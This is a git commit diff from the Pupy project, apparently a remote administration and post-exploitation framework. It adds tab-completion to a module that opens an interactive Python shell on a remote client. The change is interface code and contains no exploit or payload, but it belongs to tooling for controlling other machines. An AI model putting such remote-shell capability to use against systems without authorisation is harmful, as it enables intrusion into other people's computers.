284462290534fc88ee2de5550a91b6fe102efafd
n1nj4sec <contact@n1nj4.eu>
2016-01-08 22:46:10 +0100

    adding auto-completion to pyshell

--- pupy/modules/pyshell.py
+++ pupy/modules/pyshell.py
@@ -1,14 +1,16 @@
 # -*- coding: UTF8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
+
 from pupylib.PupyModule import *
 import sys
 import subprocess
 import threading
 import Queue
-from pupylib.utils.rpyc_utils import interact
-
 import time
+from pupylib.utils.rpyc_utils import redirected_stdo
+import readline
+
 
 __class_name__="InteractivePythonShell"
 
@@ -20,13 +22,26 @@ def enqueue_output(out, queue):
 class InteractivePythonShell(PupyModule):
 	""" open an interactive python shell on the remote client """
 	max_clients=1
+	dependencies=['pyshell']
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog='pyshell', description=self.__doc__)
 	def run(self, args):
 		try:
-			interact(self.client.conn)
+			with redirected_stdo(self.client.conn):
+				old_completer=readline.get_completer()
+				try:
+					psc=self.client.conn.modules['pyshell.controller'].PyShellController()
+					readline.set_completer(psc.get_completer())
+					readline.parse_and_bind('tab: complete')
+					while True:
+						cmd=raw_input(">>> ")
+						psc.write(cmd)
+				finally:
+					readline.set_completer(old_completer)
+					readline.parse_and_bind('tab: complete')
 		except KeyboardInterrupt:
 			pass
+				
 
 
 
